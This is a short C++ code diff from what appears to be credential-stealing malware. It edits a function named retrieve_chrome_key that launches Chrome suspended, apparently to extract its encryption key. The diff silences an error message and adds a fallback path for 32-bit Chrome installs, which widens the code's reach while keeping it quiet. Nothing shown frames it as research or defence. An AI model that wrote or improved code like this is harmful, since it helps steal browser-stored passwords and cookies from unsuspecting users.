@@ -175,7 +175,7 @@ DWORD CreateSuspendedProcess(LPCWSTR applicationPath) {
 		return pid;  // Return the PID of the suspended process
 	}
 	else {
-		std::cerr << "Failed to start process. Error: " << GetLastError() << "\n";
+		//std::cerr << "Failed to start process. Error: " << GetLastError() << "\n";
 		return 0;  // Return 0 if the process could not be created
 	}
 }
@@ -184,6 +184,10 @@ std::string retrieve_chrome_key()
 {
 	std::string extracted_key = "";
 	int target_process_id = CreateSuspendedProcess(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
+
+	if (target_process_id == 0)
+		target_process_id = CreateSuspendedProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe");
+
 	//int target_process_id = Enumeration(L"chrome.exe");
 
 	/*
